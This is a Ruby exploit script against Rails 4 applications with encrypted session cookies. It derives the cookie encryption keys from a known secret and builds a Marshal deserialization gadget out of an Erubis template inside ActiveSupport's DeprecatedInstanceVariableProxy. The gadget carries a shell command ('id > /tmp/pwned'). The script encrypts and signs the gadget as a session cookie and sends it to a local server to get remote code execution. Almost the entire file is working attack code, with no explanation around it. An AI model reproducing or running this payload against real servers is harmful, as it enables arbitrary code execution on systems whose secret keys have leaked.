  #!/usr/bin/ruby
require "openssl"
require "cgi"
require "net/http"
require "uri"
require "base64"
require "erubis"
require "active_support"
require "active_support/message_verifier"

#module ActiveSupport;module Deprecation;class DeprecatedInstanceVariableProxy;end;end;end

def decrypt_session_cookie(cookie, key)
  cookie = CGI::unescape(cookie)
  
  # Default values for Rails 4 apps
  key_iter_num = 1000
  key_size     = 64
  salt         = "encrypted cookie"         
  signed_salt  = "signed encrypted cookie"  

  secret = OpenSSL::PKCS5.pbkdf2_hmac_sha1(key, salt, key_iter_num, 64)[0,32]
  sign_secret = OpenSSL::PKCS5.pbkdf2_hmac_sha1(key, signed_salt, key_iter_num, 64)


  encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: ActiveSupport::MessageEncryptor::NullSerializer)


  code = "%x(id > /tmp/pwned)"
  erubis = Erubis::Eruby.allocate
  erubis.instance_variable_set :@src, "#{code}; 1"
  proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erubis, :result, "@result")


  #instantiating the JSON with the payload
  my_evil_session_hash = {"session_id" => "", "exploit" => proxy}

  serialized_hash = Marshal.dump(my_evil_session_hash)
  encrypted_data = encryptor.encrypt_and_sign(serialized_hash)

  puts encrypted_data	
  http = Net::HTTP.new('localhost', 3000)
  rqst = Net::HTTP::Get.new("/dashboard/home")
  res = http.request(rqst)
  reponse_cookie = res['Set-Cookie'].to_s
  cookie_name = reponse_cookie.split("=").first
  puts cookie_name

  rqst['Cookie'] = cookie_name+"=#{encrypted_data}"
  res = http.request(rqst)

  #Code to decrypt sample cookie
  cookie_decrypted =  Marshal.load(encryptor.decrypt_and_verify(cookie))
  puts cookie_decrypted

end
